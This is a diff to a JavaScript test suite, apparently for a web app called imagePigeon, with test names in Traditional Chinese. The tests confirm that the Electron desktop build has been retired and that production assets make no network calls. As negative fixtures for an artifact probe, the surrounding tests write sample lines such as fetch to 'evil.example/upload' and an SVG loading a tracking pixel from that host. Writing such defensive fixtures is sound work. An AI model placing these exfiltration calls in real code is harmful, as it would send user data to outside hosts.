@@ -57,6 +57,42 @@ test('正式來源沒有 fetch 或 XMLHttpRequest', () => {
   assert.deepEqual(xhrFiles, [])
 })
 
+test('桌面入口、專用依賴與打包資產已退役', () => {
+  const pkg = JSON.parse(read('package.json'))
+  assert.equal(pkg.main, undefined)
+  assert.equal(pkg.scripts.build, 'tsc -b && vite build')
+  for (const section of ['dependencies', 'devDependencies', 'optionalDependencies']) {
+    assert.equal(pkg[section]?.electron, undefined)
+    assert.equal(pkg[section]?.['electron-builder'], undefined)
+  }
+  assert.doesNotMatch(JSON.stringify(pkg.scripts), /electron/)
+  for (const path of [
+    'electron/main.cjs', 'electron/navigation-policy.cjs', 'electron/preload.cjs',
+    'electron/update-check.cjs', 'electron/update-ipc.cjs', 'electron-builder.yml',
+    'scripts/verify-electron-package.mjs', 'tests/electronPackagingContract.test.ts',
+    'tests/electronUpdate.test.ts', 'src/services/desktopUpdate.ts',
+    'src/services/desktopUpdate.test.ts', 'src/features/Intro/ModalDesktopUpdate.tsx',
+  ]) assert.equal(existsSync(new URL(path, root)), false, `${path} 應已退役`)
+})
+
+test('正式前端無桌面橋接，且不匯入 Electron 或 Node.js API', () => {
+  for (const url of productionSources()) {
+    const source = readFileSync(url, 'utf8')
+    assert.doesNotMatch(source, /imagePigeonDesktop|ModalDesktopUpdate|desktopUpdate/, url.pathname)
+    assert.doesNotMatch(source, /(?:from\s*|require\(\s*)['"](?:electron|node:[^'"]+|fs(?:\/[^'"]*)?|path(?:\/[^'"]*)?)['"]/, url.pathname)
+  }
+})
+
+test('首頁保留使用者主動點擊的固定檢查新版入口', () => {
+  const intro = read('src/features/Intro/Intro.tsx')
+  const links = [...intro.matchAll(/<a\b[^>]*href=\{EXTERNAL_NAVIGATION_URLS\.updateFolder\}[^>]*>[\s\S]*?<\/a>/g)]
+  assert.equal(links.length, 1)
+  assert.match(links[0][0], /target='_blank'/)
+  assert.match(links[0][0], /rel='noopener noreferrer'/)
+  assert.match(links[0][0], />\s*檢查新版\s*<\/a>/)
+  assert.match(read('src/features/PrintPreview/PrintPreviewView.tsx'), /window\.print\(\)/)
+})
+
 test('專案、圖片 ZIP 與 Word 都由 Blob URL 下載', () => {
   for (const path of [
     'src/features/Output/SaveProject.tsx',
@@ -132,6 +168,7 @@ test('產物探針拒絕第三方資源、絕對路徑、缺檔與未 hash 執�
       () => writeFileSync(join(directory, 'dist/assets/app-abcdefgh.js'), 'fetch("//evil.example/upload")'),
       () => writeFileSync(join(directory, 'dist/assets/app-abcdefgh.js'), 'fetch("https://github.com/untrusted/resource.js")'),
       () => writeFileSync(join(directory, 'dist/assets/app-abcdefgh.js'), 'fetch?.("https://pigeonhand.tw")'),
+      () => writeFileSync(join(directory, 'dist/assets/app-abcdefgh.js'), 'window.imagePigeonDesktop.checkForUpdates()'),
       () => writeFileSync(join(directory, 'dist/Logo.svg'), '<svg xmlns="http://www.w3.org/2000/svg"><image href="//evil.example/pixel.png"/></svg>'),
       () => writeFileSync(join(directory, 'dist/index.html'), readFileSync(join(directory, 'dist/index.html'), 'utf8').replace('./Logo.svg', '/Logo.svg')),
       () => writeFileSync(join(directory, 'dist/index.html'), readFileSync(join(directory, 'dist/index.html'), 'utf8').replace('./Logo.svg', './missing.svg')),
